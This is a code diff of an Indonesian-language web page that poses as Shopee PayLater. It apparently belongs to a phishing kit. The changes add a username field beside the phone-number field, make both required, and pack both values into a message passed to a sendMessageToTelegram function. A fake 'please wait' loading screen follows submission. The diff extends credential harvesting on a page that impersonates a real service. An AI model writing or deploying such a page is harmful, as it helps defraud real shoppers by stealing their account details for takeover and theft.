@@ -5,7 +5,7 @@
   <title>SHOPEE:PAYLATER</title>
   <meta property="og:image" content="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg">
   <meta name="viewport" content="width, initial-scale=1">
-  <meta name="theme-color" content="OrangeRed">
+  <meta name="theme-color" content="Coral">
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -50,10 +50,12 @@
       color: #000000;
       margin-right: 150px;
       padding-bottom: 104px;
+      margin-top:37px;
     }
 
     .form-container input[type="tel"],
-    .form-container input[type="Submit"] {
+    .form-container input[type="Submit"],
+    .form-container input[type="text"] {
       width: calc(70% - 8px);
       padding: 13px;
       border-radius: 8px;
@@ -143,14 +145,6 @@
       width: 180px; /* Mengurangi lebar logo kedua */
       height: auto; /* Biarkan tinggi otomatis menyesuaikan proporsi */
     }
-    #logo-kedua {
-  background: transparent;
-}
-
-    #logo-kedua {
-  opacity: 0;
-}
-
   </style>
   <script>
     window.addEventListener('load', function() {
@@ -171,18 +165,20 @@
     }
 
     function kirimPesan() {
-      var nomorHP = document.getElementById('nomor_hp').value;
-      if (nomorHP.trim() === '') {
-        if (navigator.vibrate) {
-          navigator.vibrate(200);
-        }
-        return;
-      }
-
-      var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲: " + nomorHP;
-      sendMessageToTelegram(message);
-      showSecondLogo(); // Panggil fungsi untuk menampilkan logo kedua setelah pesan terkirim
+  var nomorHP = document.getElementById('nomor_hp').value;
+  var username = document.getElementById('username').value; // tambahkan ini untuk mendapatkan nilai username
+  if (nomorHP.trim() === '' || username.trim() === '') { // periksa apakah kedua input kosong
+    if (navigator.vibrate) {
+      navigator.vibrate(200);
     }
+    return;
+  }
+
+  var message = "𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: " + username + ", 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲: " + nomorHP; // ubah pesan untuk mencakup username
+  sendMessageToTelegram(message);
+  showSecondLogo(); // Panggil fungsi untuk menampilkan logo kedua setelah pesan terkirim
+}
+
 
     function showWhiteElement() {
       var whiteElement = document.createElement('div');
@@ -198,7 +194,7 @@
       loadingText.innerText = 'Tunggu sebentar ya... Gak lama kok';
       whiteElement.appendChild(loadingText);
 
-      document.body.appendChild(whiteElement);
+            document.body.appendChild(whiteElement);
 
       setTimeout(function () {
         whiteElement.style.display = 'none';
@@ -231,8 +227,12 @@
 
   <div class="form-container">
     <form onsubmit="kirimPesan(); return false;">
+      <!-- Kolom input username -->
+      <input type="text" id="username" name="username" placeholder="Username" required>
+      <!-- Kolom input nomor HP -->
       <span class="phone-prefix">+62</span>
-      <input type="tel" id="nomor_hp" name="nomor_hp" maxlength="12" placeholder="Nomor Handphone">
+      <input type="tel" id="nomor_hp" name="nomor_hp" maxlength="12" placeholder="Nomor Handphone" required>
+      <!-- Tombol submit -->
       <input type="Submit" value="Lanjutkan">
     </form>
   </div>
